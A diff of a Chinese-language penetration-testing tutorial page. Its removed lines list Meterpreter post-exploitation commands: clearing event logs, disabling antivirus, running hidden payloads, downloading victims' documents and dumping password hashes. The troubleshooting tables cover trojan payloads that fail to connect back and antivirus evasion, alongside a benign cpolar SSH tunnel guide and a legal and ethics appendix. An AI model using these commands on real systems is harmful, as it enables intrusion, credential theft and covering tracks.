+                <!-- ========== 第四章 ========== -->
+                <h2 id="cpolar">第四章：Kali + cpolar 实现 SSH 远程连接</h2>
+                <blockquote>
+                    <p>适用场景：Kali 在内网（没有公网 IP），你人在外面想远程 SSH 连上 Kali 操作。</p>
+                </blockquote>
 
-meterpreter &gt; run post/windows/manage/enable_rdp
-# 仅启用远程桌面（不创建用户）
+                <h3>原理示意</h3>
+                <pre><code>你（外网任意地方）→ cpolar公网域名:端口 → cpolar隧道 → Kali本地SSH(22端口)</code></pre>
 
-meterpreter &gt; idletime
-# 查看用户空闲时间（判断是否适合操作）
-</code></pre>
-<h3 id="38">3.8 网络相关</h3>
-<pre><code class="language-bash">meterpreter &gt; ipconfig
-# 查看目标机网络配置
-
-meterpreter &gt; ifconfig
-# 同上（Linux 风格命令名）
-
-meterpreter &gt; netstat -an
-# 查看所有网络连接和监听端口
-
-meterpreter &gt; route
-# 查看/修改路由表
-
-meterpreter &gt; arp
-# 查看 ARP 缓存表
-
-meterpreter &gt; portfwd add -l &lt;本地端口&gt; -p &lt;目标端口&gt; -r &lt;目标IP&gt;
-# 端口转发：将目标内网端口映射到 Kali 本地
-# 示例：将目标内网 3389 映射到 Kali 的 1234 端口
-meterpreter &gt; portfwd add -l 1234 -p 3389 -r 127.0.0.1
-
-meterpreter &gt; portfwd list
-# 列出所有端口转发规则
-
-meterpreter &gt; portfwd delete -l &lt;本地端口&gt;
-# 删除指定端口转发
-</code></pre>
-<h3 id="39">3.9 清除痕迹</h3>
-<pre><code class="language-bash">meterpreter &gt; clearev
-# 清除 Application、System、Security 三类 Windows 事件日志
-
-meterpreter &gt; run multi_console_command -rc /root/cleanup.rc
-# 批量执行资源文件中的清理命令
-</code></pre>
-<h3 id="310">3.10 其他实用模块</h3>
-<pre><code class="language-bash">meterpreter &gt; run scraper
-# 自动收集大量系统信息（用户、网络、补丁、软件等）
-
-meterpreter &gt; run killav
-# 尝试关闭目标机上的杀毒软件
-
-meterpreter &gt; run post/windows/gather/checkvm
-# 检测目标是否运行在虚拟机中
-
-meterpreter &gt; run post/multi/recon/local_exploit_suggester
-# 自动检测本地提权漏洞
-
-meterpreter &gt; load powershell
-# 加载 PowerShell 扩展
-
-meterpreter &gt; powershell_execute &quot;Get-Process | Select Name,Id&quot;
-# 执行 PowerShell 命令
-
-meterpreter &gt; background
-# 将会话放入后台（返回 msf 控制台）
-# 之后可用 sessions -i &lt;id&gt; 重新进入
-</code></pre>
-<h3 id="311">3.11 一条龙操作示例</h3>
-<pre><code class="language-bash"># 场景：上传 Payload → 后台执行 → 下载结果
-meterpreter &gt; upload /root/payload.exe C:\\Users\\Public\\
-meterpreter &gt; execute -f C:\\Users\\Public\\payload.exe -i -H
-meterpreter &gt; download C:\\Users\\Public\\result.txt /root/loot/
-
-# 场景：搜索敏感文件并打包下载
-meterpreter &gt; search -f *.docx -d C:\\Users\\
-meterpreter &gt; search -f *.pdf -d C:\\Users\\
-meterpreter &gt; download C:\\Users\\Admin\\Documents\\secret.docx /root/loot/
-
-# 场景：抓取密码哈希 → 离线破解
-meterpreter &gt; hashdump
-# 将输出的哈希保存为 hash.txt
-# 用 hashcat 离线破解：
-# hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
-</code></pre>
-<hr />
-<h2 id="4-kali-cpolar-ssh">4. Kali + cpolar 实现 SSH 远程连接</h2>
-<blockquote>
-<p>适用场景：Kali 在内网（无公网 IP），需要通过外网 SSH 远程连接操作。</p>
-</blockquote>
-<h3 id="_4">架构示意</h3>
-<pre><code>外网用户 → cpolar公网域名:端口 → cpolar隧道 → Kali本地(22端口)
-</code></pre>
-<hr />
-<h3 id="41-ssh">4.1 启动并配置 SSH 服务</h3>
-<pre><code class="language-bash"># 启动 SSH 服务
+                <h3>4.1 启动并配置 SSH 服务</h3>
+                <pre><code># Kali 上启动 SSH
 sudo systemctl start ssh
+sudo systemctl status ssh         # 确认 Active: active (running)
+sudo systemctl enable ssh         # 开机自启</code></pre>
 
-# 查看运行状态
-sudo systemctl status ssh
-# 应看到：Active: active (running)
+                <p><strong>配置允许密码登录：</strong></p>
+                <pre><code>sudo vim /etc/ssh/sshd_config</code></pre>
+                <p>找到并修改：</p>
+                <pre><code>PasswordAuthentication yes       # 允许密码认证
+PermitRootLogin yes              # 允许 root 登录（建议用普通用户）
+PubkeyAuthentication yes         # 允许密钥认证</code></pre>
+                <p>修改后重启 SSH：</p>
+                <pre><code>sudo systemctl restart ssh</code></pre>
 
-# 设置开机自启
-sudo systemctl enable ssh
-</code></pre>
-<p><strong>配置 SSH 允许密码登录（默认可能仅允许密钥登录）：</strong></p>
-<pre><code class="language-bash"># 编辑 SSH 配置文件
-sudo vim /etc/ssh/sshd_config
-</code></pre>
-<p>找到并修改以下配置项：</p>
-<pre><code># 允许密码认证
-PasswordAuthentication yes
+                <div class="tutorial-tip">
+                    <strong>安全建议：</strong>修改默认端口（22→2222）减少扫描；使用强密码；限制登录尝试次数 <code>MaxAuthTries 3</code>。
+                </div>
 
-# 允许 root 远程登录（可选，建议用普通用户）
-PermitRootLogin yes
+                <h3>4.2 注册 cpolar</h3>
+                <ol>
+                    <li>访问 <a href="https://www.cpolar.com/" target="_blank" rel="noopener">cpolar 官网</a> 注册账号</li>
+                    <li>登录后进入 <a href="https://dashboard.cpolar.com/" target="_blank" rel="noopener">仪表盘</a></li>
+                    <li>在「验证」页面找到你的 <strong>Authtoken</strong>（一串很长的字符）</li>
+                </ol>
 
-# 允许密钥认证
-PubkeyAuthentication yes
-</code></pre>
-<p>保存后重启 SSH 服务使配置生效：</p>
-<pre><code class="language-bash">sudo systemctl restart ssh
-</code></pre>
-<p><strong>安全建议：</strong></p>
-<ul>
-<li>修改默认 SSH 端口（22 → 2222 或其他高位端口）：
-  <code>Port 2222</code></li>
-<li>使用强密码或仅使用密钥登录</li>
-<li>限制登录尝试次数：
-  <code>MaxAuthTries 3</code></li>
-</ul>
-<hr />
-<h3 id="42-cpolar">4.2 注册 cpolar 账号</h3>
-<ol>
-<li>访问 <a href="https://www.cpolar.com/">cpolar 官网</a></li>
-<li>点击「注册」填写邮箱和密码</li>
-<li>登录后进入 <a href="https://dashboard.cpolar.com/">仪表盘</a></li>
-<li>在「验证」页面找到你的 <strong>Authtoken</strong>（后续认证需要）</li>
-</ol>
-<hr />
-<h3 id="43-cpolar">4.3 安装 cpolar</h3>
-<pre><code class="language-bash"># 方式一：一键安装脚本（推荐）
-curl -L https://www.cpolar.com/static/downloads/install-release-cpolar.sh | sudo bash
+                <h3>4.3 安装 cpolar</h3>
+                <pre><code>curl -L https://www.cpolar.com/static/downloads/install-release-cpolar.sh | sudo bash
+cpolar version    # 验证安装成功</code></pre>
 
-# 方式二：手动安装
-# 1. 下载对应架构的包
-# 2. dpkg -i cpolar_*.deb 或 rpm -ivh cpolar_*.rpm
-</code></pre>
-<p><strong>安装后验证：</strong></p>
-<pre><code class="language-bash">cpolar version
-# 输出示例：cpolar version 3.x.x
-</code></pre>
-<hr />
-<h3 id="44-cpolar">4.4 配置 cpolar 认证</h3>
-<pre><code class="language-bash"># 将 &lt;你的Authtoken&gt; 替换为 cpolar 仪表盘中获取的 token
-cpolar authtoken &lt;你的Authtoken&gt;
+                <h3>4.4 配置认证</h3>
+                <pre><code>cpolar authtoken 你的Authtoken
+# 例子：cpolar authtoken ZjViODQwZWYtYjI0NS00xxxxxxxxxxxxx</code></pre>
+                <p>配置一次即可，信息存在 <code>~/.cpolar/cpolar.yml</code>。</p>
 
-# 示例：
-cpolar authtoken ZjViODQwZWYtYjI0NS00xxxxxxxxxxxxxxxxxxxxxxx
-</code></pre>
-<p><strong>注意：</strong> Authtoken 只需配置一次，配置信息保存在 <code>~/.cpolar/cpolar.yml</code> 中。</p>
-<hr />
-<h3 id="45-ssh">4.5 创建 SSH 隧道</h3>
-<pre><code class="language-bash"># 创建 TCP 隧道，将本地 22 端口暴露到公网
-cpolar tcp 22
-</code></pre>
-<p><strong>预期输出：</strong></p>
-<pre><code>Forwarding     tcp://0.tcp.cpolar.cn:12345 -&gt; localhost:22
-</code></pre>
-<p>此时你的 SSH 连接地址为：</p>
-<pre><code>ssh &lt;用户名&gt;@0.tcp.cpolar.cn -p 12345
-</code></pre>
-<hr />
-<h3 id="46">4.6 后台运行 &amp; 开机自启</h3>
-<pre><code class="language-bash"># 方式一：使用 systemd 后台运行
+                <h3>4.5 创建 SSH 隧道</h3>
+                <pre><code>cpolar tcp 22</code></pre>
+                <p><strong>输出：</strong></p>
+                <pre><code>Forwarding     tcp://0.tcp.cpolar.cn:12345 -> localhost:22</code></pre>
+                <p>这个地址就是你的公网 SSH 地址：</p>
+                <pre><code>ssh 用户名@0.tcp.cpolar.cn -p 12345</code></pre>
+
+                <h3>4.6 后台运行 & 开机自启</h3>
+                <pre><code># 方式一：systemd
 sudo systemctl enable cpolar
 sudo systemctl start cpolar
 
-# 方式二：使用 screen 保持后台
+# 方式二：screen 保持后台
 screen -S cpolar
 cpolar tcp 22
-# Ctrl+A, D 分离（断开但不停止）
+# 按 Ctrl+A 再按 D（分离但不停止）
+# 恢复：screen -r cpolar</code></pre>
 
-# 恢复 screen 会话
-screen -r cpolar
-</code></pre>
-<hr />
-<h3 id="47-web">4.7 Web 管理界面</h3>
-<pre><code class="language-bash"># 启动 cpolar 后，访问本地 Web 管理界面
-# 浏览器打开：http://127.0.0.1:9200
+                <h3>4.7 Web 管理界面</h3>
+                <p>浏览器打开 <code>http://127.0.0.1:9200</code>，可以查看所有隧道、流量统计、创建/删除隧道。</p>
 
-# 如果没有 GUI 浏览器，可以用 curl 查看：
-curl http://127.0.0.1:9200/api/tunnels
-</code></pre>
-<p>在 Web 界面可以：
-- 查看所有活跃隧道及公网地址
-- 查看流量统计
-- 创建/删除隧道
-- 配置隧道参数（HTTP/TCP/TLS）</p>
-<hr />
-<h3 id="48-tcp-pro">4.8 固定 TCP 地址（Pro 功能）</h3>
-<p>免费版 cpolar 每次重启 tunnel 会分配<strong>随机域名</strong>。如需固定地址：</p>
-<ol>
-<li>升级到 cpolar Pro 版</li>
-<li>在仪表盘「预留」中创建固定 TCP 地址</li>
-<li>配置文件中使用固定地址：</li>
-</ol>
-<pre><code class="language-yaml"># ~/.cpolar/cpolar.yml
+                <h3>4.8 固定 TCP 地址（Pro 版）</h3>
+                <p>免费版每次重连域名随机变。如需固定地址，升级 Pro 后在仪表盘「预留」中创建固定 TCP 地址，然后配置：</p>
+                <pre><code># ~/.cpolar/cpolar.yml
 tunnels:
   ssh:
     proto: tcp
     addr: 22
-    remote_addr: &lt;你的固定地址&gt;.cpolar.cn
-    remote_port: &lt;你的固定端口&gt;
-</code></pre>
-<hr />
-<h3 id="49">4.9 配置多个隧道（配置文件方式）</h3>
-<p>编辑 <code>~/.cpolar/cpolar.yml</code>：</p>
-<pre><code class="language-yaml">authtoken: &lt;你的token&gt;
+    remote_addr: 你的固定地址.cpolar.cn
+    remote_port: 你的固定端口</code></pre>
+
+                <h3>4.9 同时配置多个隧道</h3>
+                <pre><code># ~/.cpolar/cpolar.yml
+authtoken: 你的token
 tunnels:
   ssh:
     addr: 22
@@ -1282,312 +750,150 @@ tunnels:
     addr: 80
     proto: http
     region: cn_vip
-    hostname: your-web.cpolar.cn
   vnc:
     addr: 5901
     proto: tcp
-    region: cn_vip
-</code></pre>
-<p>启动所有隧道：</p>
-<pre><code class="language-bash">cpolar start-all
-</code></pre>
-<hr />
-<h3 id="410">4.10 外网连接测试</h3>
-<pre><code class="language-bash"># 在另一台机器上（或手机 Termux/JuiceSSH）
-ssh kali@0.tcp.cpolar.cn -p 12345
+    region: cn_vip</code></pre>
+                <pre><code>cpolar start-all    # 启动所有隧道</code></pre>
 
-# 输入密码后即可远程操作 Kali
-# 断开连接：exit 或 Ctrl+D
-</code></pre>
-<hr />
-<h2 id="5_2">5. 故障排查</h2>
-<h3 id="51">5.1 木马生成失败</h3>
-<table>
-<thead>
-<tr>
-<th>问题</th>
-<th>原因</th>
-<th>解决</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>msfvenom: command not found</code></td>
-<td>Metasploit 未安装</td>
-<td><code>apt install metasploit-framework -y</code></td>
-</tr>
-<tr>
-<td><code>No space left on device</code></td>
-<td>磁盘空间不足</td>
-<td><code>df -h</code> 检查，清理旧文件</td>
-</tr>
-<tr>
-<td>生成后文件大小为 0</td>
-<td>权限不足</td>
-<td>使用 <code>sudo</code> 或切换到 root</td>
-</tr>
-</tbody>
-</table>
-<h3 id="52">5.2 靶机运行木马后不上线</h3>
-<table>
-<thead>
-<tr>
-<th>问题</th>
-<th>原因</th>
-<th>解决</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>防火墙拦截</td>
-<td>Windows Defender / 第三方防火墙</td>
-<td>临时关闭防火墙测试</td>
-</tr>
-<tr>
-<td>IP 填写错误</td>
-<td>LHOST 填了错误的 IP</td>
-<td>用 <code>ifconfig</code> 重新确认 Kali IP</td>
-</tr>
-<tr>
-<td>端口未监听</td>
-<td>MSF 监听未启动</td>
-<td><code>ss -tlnp</code> 检查端口是否在监听</td>
-</tr>
-<tr>
-<td>网络不通</td>
-<td>靶机无法访问 Kali</td>
-<td><code>ping &lt;Kali IP&gt;</code> 测试连通性</td>
-</tr>
-<tr>
-<td>Payload 不匹配</td>
-<td>生成与监听的 payload 不一致</td>
-<td>确保两边的 <code>windows/x64/meterpreter/reverse_tcp</code> 完全一致</td>
-</tr>
-<tr>
-<td>架构不匹配</td>
-<td>64 位 payload 在 32 位系统运行</td>
-<td>使用 32 位 payload</td>
-</tr>
-</tbody>
-</table>
-<h3 id="53-apache">5.3 Apache 无法启动</h3>
-<pre><code class="language-bash"># 检查 80 端口是否被占用
+                <hr />
+
+                <!-- ========== 第五章 ========== -->
+                <h2 id="troubleshoot">第五章：故障排查</h2>
+
+                <h3>5.1 木马生成失败</h3>
+                <table>
+                    <thead><tr><th>问题</th><th>原因</th><th>解决</th></tr></thead>
+                    <tbody>
+                        <tr><td><code>msfvenom: command not found</code></td><td>Metasploit 未安装</td><td><code>apt install metasploit-framework -y</code></td></tr>
+                        <tr><td>文件大小为 0</td><td>权限不足</td><td>用 <code>sudo</code> 或切到 root</td></tr>
+                        <tr><td><code>No space left on device</code></td><td>磁盘满了</td><td><code>df -h</code> 检查，清旧文件</td></tr>
+                    </tbody>
+                </table>
+
+                <h3>5.2 靶机运行后不上线</h3>
+                <table>
+                    <thead><tr><th>原因</th><th>检查方法</th></tr></thead>
+                    <tbody>
+                        <tr><td>防火墙拦截</td><td>临时关闭 Windows Defender 防火墙</td></tr>
+                        <tr><td>IP 填错了</td><td>用 <code>ifconfig</code> 重新确认 Kali IP，重新生成木马</td></tr>
+                        <tr><td>端口没在监听</td><td><code>ss -tlnp | grep 4444</code> 检查</td></tr>
+                        <tr><td>网络不通</td><td>靶机 ping Kali IP 测试连通性</td></tr>
+                        <tr><td>Payload 不一致</td><td>生成和监听两边的 payload 必须完全一样</td></tr>
+                        <tr><td>架构不匹配</td><td>64 位 payload 跑在 32 位系统会失败，换 32 位</td></tr>
+                    </tbody>
+                </table>
+
+                <h3>5.3 Apache 无法启动</h3>
+                <pre><code># 检查 80 端口是否被占用
 sudo ss -tlnp | grep :80
 
-# 如果被占用，停掉占用进程或改用其他端口
-# 编辑 Apache 配置修改监听端口
+# 如果被占，改端口
 sudo vim /etc/apache2/ports.conf
-# 将 Listen 80 改为 Listen 8080
-sudo systemctl restart apache2
-</code></pre>
-<h3 id="54">5.4 会话不稳定/频繁断开</h3>
-<table>
-<thead>
-<tr>
-<th>原因</th>
-<th>解决</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>网络波动</td>
-<td>TCP 连接对网络质量敏感</td>
-</tr>
-<tr>
-<td>杀软查杀</td>
-<td>使用 Veil、Shellter 等工具做免杀</td>
-</tr>
-<tr>
-<td>进程被杀</td>
-<td>迁移到稳定进程 <code>migrate &lt;PID&gt;</code></td>
-</tr>
-<tr>
-<td>超时设置</td>
-<td><code>set SessionCommunicationTimeout 0</code> 关闭超时</td>
-</tr>
-</tbody>
-</table>
-<h3 id="55-android-apk">5.5 Android APK 无法安装</h3>
-<table>
-<thead>
-<tr>
-<th>问题</th>
-<th>原因</th>
-<th>解决</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>「解析失败」</td>
-<td>APK 未签名</td>
-<td>按步骤 2.2 执行签名流程</td>
-</tr>
-<tr>
-<td>「未知来源」</td>
-<td>未授权安装</td>
-<td>设置 → 安全 → 允许「未知来源」</td>
-</tr>
-<tr>
-<td>「安装包破损」</td>
-<td>下载不完整</td>
-<td>重新生成并签名</td>
-</tr>
-<tr>
-<td>「版本过低」</td>
-<td>SDK 版本不兼容</td>
-<td>检查 Android 版本（需 Android 6.0+）</td>
-</tr>
-</tbody>
-</table>
-<h3 id="56-cpolar">5.6 cpolar 连接失败</h3>
-<table>
-<thead>
-<tr>
-<th>问题</th>
-<th>原因</th>
-<th>解决</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>authtoken invalid</code></td>
-<td>token 错误或过期</td>
-<td>登录 cpolar 仪表盘重新获取</td>
-</tr>
-<tr>
-<td>隧道启动后外网不通</td>
-<td>SSH 服务未运行</td>
-<td><code>systemctl start ssh</code></td>
-</tr>
-<tr>
-<td>端口显示 offline</td>
-<td>本地服务未监听</td>
-<td><code>ss -tlnp | grep 22</code> 确认 SSH 已启动</td>
-</tr>
-<tr>
-<td>连接频繁断开</td>
-<td>免费版限制</td>
-<td>升级到 Pro 或使用心跳保持连接</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<h2 id="_5">附录</h2>
-<h3 id="a">A. 常用快捷键</h3>
-<table>
-<thead>
-<tr>
-<th>快捷键</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>Ctrl+C</code></td>
-<td>在 msfconsole 中终止当前操作</td>
-</tr>
-<tr>
-<td><code>Ctrl+Z</code></td>
-<td>将当前会话放入后台</td>
-</tr>
-<tr>
-<td><code>Ctrl+D</code></td>
-<td>退出 shell / 退出 msfconsole</td>
-</tr>
-<tr>
-<td><code>Ctrl+L</code></td>
-<td>清屏</td>
-</tr>
-<tr>
-<td><code>Ctrl+R</code></td>
-<td>搜索历史命令</td>
-</tr>
-</tbody>
-</table>
-<h3 id="b">B. 推荐学习资源</h3>
-<ul>
-<li><a href="https://www.offsec.com/metasploit-unleashed/">Metasploit Unleashed</a> — 官方免费教程</li>
-<li><a href="https://www.hackthebox.com/">Hack The Box</a> — 在线渗透测试实验平台</li>
-<li><a href="https://pentesterlab.com/">PentesterLab</a> — Web 渗透实践</li>
-<li><a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a> — Web 安全风险清单</li>
-</ul>
-<h3 id="c">C. 法律与伦理</h3>
-<ul>
-<li>仅在<strong>自己拥有</strong>或<strong>获得明确书面授权</strong>的系统上进行测试</li>
-<li>学习渗透测试的目的是<strong>提升防御能力</strong>，而非攻击他人</li>
-<li>未经授权入侵计算机系统可能构成<strong>刑事犯罪</strong></li>
-<li>建议在隔离的实验环境（虚拟机 + 内网）中练习</li>
-</ul>
-</div>
-    </div>
+# 把 Listen 80 改成 Listen 8080
+sudo systemctl restart apache2</code></pre>
 
-    <footer class="site-footer">
-        <div class="footer-text">
-            <a href="index.html">← 返回主页</a>
+                <h3>5.4 会话不稳定 / 频繁断开</h3>
+                <table>
+                    <thead><tr><th>原因</th><th>解决</th></tr></thead>
+                    <tbody>
+                        <tr><td>网络波动</td><td>TCP 对网络质量敏感，换 <code>reverse_https</code> 试试</td></tr>
+                        <tr><td>杀软查杀</td><td>用 Veil、Shellter 做免杀</td></tr>
+                        <tr><td>进程被杀</td><td>迁移到稳定进程：<code>migrate 目标PID</code></td></tr>
+                        <tr><td>超时设置</td><td><code>set SessionCommunicationTimeout 0</code> 关闭超时</td></tr>
+                    </tbody>
+                </table>
+
+                <h3>5.5 Android APK 无法安装</h3>
+                <table>
+                    <thead><tr><th>问题</th><th>原因</th><th>解决</th></tr></thead>
+                    <tbody>
+                        <tr><td>「解析失败」</td><td>APK 没签名</td><td>回到步骤 2.2 签名</td></tr>
+                        <tr><td>「未知来源」</td><td>系统禁止侧载</td><td>设置→安全→允许「未知来源」</td></tr>
+                        <tr><td>「安装包破损」</td><td>下载不完整</td><td>重新生成并签名</td></tr>
+                        <tr><td>「版本过低」</td><td>SDK 不兼容</td><td>检查 Android 版本（需 6.0+）</td></tr>
+                    </tbody>
+                </table>
+
+                <h3>5.6 cpolar 连接失败</h3>
+                <table>
+                    <thead><tr><th>问题</th><th>原因</th><th>解决</th></tr></thead>
+                    <tbody>
+                        <tr><td><code>authtoken invalid</code></td><td>token 错或过期</td><td>仪表盘重新复制</td></tr>
+                        <tr><td>外网不通</td><td>SSH 没运行</td><td><code>systemctl start ssh</code></td></tr>
+                        <tr><td>显示 offline</td><td>本地服务没监听</td><td><code>ss -tlnp | grep 22</code></td></tr>
+                        <tr><td>频繁断开</td><td>免费版限制</td><td>升级 Pro 或用心跳</td></tr>
+                    </tbody>
+                </table>
+
+                <hr />
+
+                <h2>附录</h2>
+
+                <h3>A. 常用快捷键</h3>
+                <table>
+                    <thead><tr><th>快捷键</th><th>作用</th></tr></thead>
+                    <tbody>
+                        <tr><td><code>Ctrl+C</code></td><td>终止当前 msfconsole 操作</td></tr>
+                        <tr><td><code>Ctrl+Z</code></td><td>当前会话放后台</td></tr>
+                        <tr><td><code>Ctrl+D</code></td><td>退出 shell / 退出 msfconsole</td></tr>
+                        <tr><td><code>Ctrl+L</code></td><td>清屏</td></tr>
+                        <tr><td><code>Ctrl+R</code></td><td>搜索历史命令</td></tr>
+                    </tbody>
+                </table>
+
+                <h3>B. 推荐学习资源</h3>
+                <ul>
+                    <li><a href="https://www.offsec.com/metasploit-unleashed/" target="_blank" rel="noopener">Metasploit Unleashed</a> — 官方免费教程</li>
+                    <li><a href="https://www.hackthebox.com/" target="_blank" rel="noopener">Hack The Box</a> — 在线渗透测试实验平台</li>
+                    <li><a href="https://pentesterlab.com/" target="_blank" rel="noopener">PentesterLab</a> — Web 渗透实战</li>
+                    <li><a href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener">OWASP Top 10</a> — Web 安全风险清单</li>
+                </ul>
+
+                <h3>C. 法律与伦理（请认真阅读）</h3>
+                <ul>
+                    <li>仅在<strong>自己拥有</strong>或<strong>获得明确书面授权</strong>的系统上测试</li>
+                    <li>学习渗透测试的目的是<strong>提升防御能力</strong></li>
+                    <li>未经授权入侵计算机系统构成<strong>刑事犯罪</strong></li>
+                    <li>建议在<strong>隔离实验环境</strong>（虚拟机 + 纯内网）中练习</li>
+                </ul>
+
+                <a href="index.html" class="tutorial-back">← 返回主页</a>
+
+            </div>
         </div>
-    </footer>
+    </main>
 
-    <!-- Code Particles Background -->
+    <!-- Theme Toggle + Nav Scroll -->
     <script>
         (function() {
-            const canvas = document.getElementById('particle-canvas');
-            const ctx = canvas.getContext('2d');
-            let W, H;
-            const PARTICLE_COUNT = 100;
-            const particles = [];
-            const chars = '01{}[]()<>/\\|#*+-=~^λΣΠΩΔΘΞΨΦ23456789ABCDEFｦｧｨｩｪｫｬｭｮｯｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿ░▒▓█▀▄■□▪▫●○◆◇▲△▼▽importexportconstasyncawaitfunctionreturnclass田由甲申甶电甴男甸甹町画甼甽甾甿畀畁畂畃'.split('');
-            const colors = ['rgba(129,140,248,ALPHA)','rgba(99,102,241,ALPHA)','rgba(79,70,229,ALPHA)','rgba(6,182,212,ALPHA)','rgba(34,211,238,ALPHA)','rgba(139,92,246,ALPHA)','rgba(167,139,250,ALPHA)','rgba(148,163,184,ALPHA)'];
-            function resize() { W = canvas.width = window.innerWidth; H = canvas.height = window.innerHeight; }
-            resize();
-            window.addEventListener('resize', resize);
-            function createParticle() {
-                return { x: Math.random() * W, y: Math.random() * H, vx: (Math.random() - 0.5) * 0.6, vy: (Math.random() - 0.5) * 0.6, char: chars[Math.floor(Math.random() * chars.length)], size: 10 + Math.random() * 18, baseAlpha: 0.15 + Math.random() * 0.5, alpha: 0, targetAlpha: 0.15 + Math.random() * 0.5, color: colors[Math.floor(Math.random() * colors.length)], glowColor: colors[Math.floor(Math.random() * 3)], phase: Math.random() * Math.PI * 2, pulseSpeed: 0.003 + Math.random() * 0.008, driftForce: 0.001 + Math.random() * 0.004, wobbleAmp: 0.1 + Math.random() * 0.3 };
+            var html = document.documentElement;
+            var toggle = document.getElementById('themeToggle');
+            function getTheme() {
+                var s = localStorage.getItem('theme');
+                return s || (window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark');
             }
-            for (let i = 0; i < PARTICLE_COUNT; i++) { const p = createParticle(); p.alpha = p.targetAlpha; particles.push(p); }
-            let mouseX = -1000, mouseY = -1000;
-            document.addEventListener('mousemove', function(e) { mouseX = e.clientX; mouseY = e.clientY; });
-            document.addEventListener('mouseleave', function() { mouseX = -1000; mouseY = -1000; });
-            function draw(time) {
-                ctx.clearRect(0, 0, W, H);
-                for (let i = 0; i < PARTICLE_COUNT; i++) {
-                    const p = particles[i];
-                    p.vx += (Math.sin(time * p.driftForce + p.phase) * p.wobbleAmp) * 0.01;
-                    p.vy += (Math.cos(time * p.driftForce * 1.3 + p.phase) * p.wobbleAmp) * 0.01;
-                    p.vx += (Math.random() - 0.5) * 0.02;
-                    p.vy += (Math.random() - 0.5) * 0.02;
-                    const dx = mouseX - p.x, dy = mouseY - p.y;
-                    const dist = Math.sqrt(dx * dx + dy * dy);
-                    if (dist < 200 && dist > 0) { const force = (200 - dist) / 200 * 0.003; p.vx += (dx / dist) * force; p.vy += (dy / dist) * force; }
-                    const speed = Math.sqrt(p.vx * p.vx + p.vy * p.vy);
-                    if (speed > 0.8) { p.vx = (p.vx / speed) * 0.8; p.vy = (p.vy / speed) * 0.8; }
-                    if (speed < 0.05) { p.vx += (Math.random() - 0.5) * 0.04; p.vy += (Math.random() - 0.5) * 0.04; }
-                    p.x += p.vx; p.y += p.vy;
-                    if (p.x < -20) p.x = W + 20; if (p.x > W + 20) p.x = -20;
-                    if (p.y < -20) p.y = H + 20; if (p.y > H + 20) p.y = -20;
-                    p.targetAlpha = p.baseAlpha + Math.sin(time * p.pulseSpeed + p.phase) * 0.15;
-                    p.alpha += (p.targetAlpha - p.alpha) * 0.02;
-                    const alpha = Math.max(0.05, Math.min(0.8, p.alpha));
-                    ctx.save();
-                    ctx.shadowBlur = 8;
-                    ctx.shadowColor = p.glowColor.replace('ALPHA', '0.4');
-                    ctx.globalAlpha = alpha * 0.5;
-                    ctx.font = 'bold ' + p.size + 'px "Courier New", monospace';
-                    ctx.fillStyle = p.glowColor.replace('ALPHA', '1');
-                    ctx.fillText(p.char, p.x, p.y);
-                    ctx.restore();
-                    ctx.font = 'bold ' + p.size + 'px "Courier New", monospace';
-                    ctx.fillStyle = p.color.replace('ALPHA', String(alpha));
-                    ctx.fillText(p.char, p.x, p.y);
-                }
-                if (Math.random() < 0.02) { const idx = Math.floor(Math.random() * PARTICLE_COUNT); particles[idx] = createParticle(); }
-                requestAnimationFrame(draw);
+            function apply(t) {
+                if (t === 'light') html.setAttribute('data-theme', 'light');
+                else html.removeAttribute('data-theme');
             }
-            requestAnimationFrame(draw);
+            apply(getTheme());
+            if (toggle) {
+                toggle.addEventListener('click', function() {
+                    var n = html.getAttribute('data-theme') === 'light' ? 'dark' : 'light';
+                    apply(n);
+                    localStorage.setItem('theme', n);
+                });
+            }
+            window.matchMedia('(prefers-color-scheme: light)').addEventListener('change', function(e) {
+                if (!localStorage.getItem('theme')) apply(e.matches ? 'light' : 'dark');
+            });
+            var nav = document.getElementById('mainNav');
+            window.addEventListener('scroll', function() {
+                nav.classList.toggle('scrolled', window.scrollY > 10);
+            }, { passive: true });
         })();
     </script>
-
-    
-    
 
 </body>
 </html>
